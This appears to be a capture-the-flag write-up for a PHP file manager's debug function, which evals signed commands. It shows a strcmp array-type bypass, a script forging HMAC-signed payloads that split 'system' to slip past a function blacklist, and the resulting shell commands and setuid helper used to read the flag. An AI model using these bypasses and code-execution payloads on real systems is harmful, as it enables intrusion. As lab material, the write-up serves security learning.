#./config/conf.php
<?php

// Configuration Variables

// login to use dafuqManager: (true/false)
$GLOBALS["require_login"] = true;

$GLOBALS["language"] = "en";

// the filename of the dafuqManager script: (you rarely need to change this)
$GLOBALS["script_name"] = "https://" . $GLOBALS['__SERVER']['HTTP_HOST'] . $GLOBALS['__SERVER']["PHP_SELF"];

// allow Zip, Tar, TGz -> Only (experimental) Zip-support
$GLOBALS["zip"] = true;	//function_exists("gzcompress");
$GLOBALS["tar"] = false;
$GLOBALS["tgz"] = false;

// dafuqManager version:
$GLOBALS["version"] = "0.8.7-rc3";

// Global User Variables (used when $require_login==false)

// the home directory for the filemanager: (use '/', not '\' or '\\', no trailing '/')
$GLOBALS["home_dir"] = "";

// the url corresponding with the home directory: (no trailing '/')
$GLOBALS["home_url"] = "";

// show hidden files in dafuqManager: (hide files starting with '.', as in Linux/UNIX)
$GLOBALS["show_hidden"] = true;

// filenames not allowed to access: (uses PCRE regex syntax)
$GLOBALS["no_access"] = "^\.ht";

// user permissions bitfield: (1=modify, 2=password, 4=admin, add the numbers)
$GLOBALS["permissions"] = 7;

/* NOTE:
	File ".config/.htusers.php" using PCRE Regex Syntax.
	Further information go to http://www.php.net/pcre.pattern.syntax
 */

$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
==========================================================
#debug 功能执行命令
#./core/fun_debug.php
function do_debug() {
    assert(strlen($GLOBALS['secret_key']) > 40);
    $dir = $GLOBALS['__GET']['dir'];
    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
        show_error('You are not hacky enough :(');
    }
    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
    $cmd = base64_decode($cmd);
    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
    foreach ($bad_things as $bad) {
        if (stristr($cmd, $bad)) {
            die('2bad');
        }
    }
    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
        die(eval($cmd));
    } else {
        show_error('What does the fox say?');
    }
}
==========================================================
绕过strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")
利用数组绕过$dir[]="test"
==========================================================
<?php
$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
function make_command($cmd) {
    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
    return sprintf('%s.%s', base64_encode($cmd), $hmac);
}
$command="\$a=\"sys\".\"tem\";\$a(\"cat flag3/flag3 2>&1 \");";
#eval($command);
echo make_command($command);

cat: flag3/flag3: Permission denied

whoami
www-data

cat flag3/meow.c
#include <stdio.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char *argv[])
{
	const char *exec = argv[0];
	const char *flag = argv[1];
	char buffer[4096];

	if(argc < 2) {
		printf("Usage: %s flag\n", argv[0]);
		puts("We have cat to read file, And the meow to cat flag.");
		return 0;
	}

	struct stat S;
	if(stat(exec, &S) != 0) {
		printf("Can not stat file %s\n", exec);
		return 1;
	}

	uid_t uid = S.st_uid;
	gid_t gid = S.st_gid;

	setuid(uid);
	seteuid(uid);
	setgid(gid);
	setegid(gid);

	int fd = open(flag, O_RDONLY);
	if(fd == -1) {
		printf("Can not open file %s\n", flag);
		return 2;
	}
	ssize_t readed = read(fd, buffer, sizeof(buffer) - 1);
	if(readed > 0) {
		write(1, buffer, readed);
	}
	close(fd);
}

./flag3/meow ./flag3/flag3 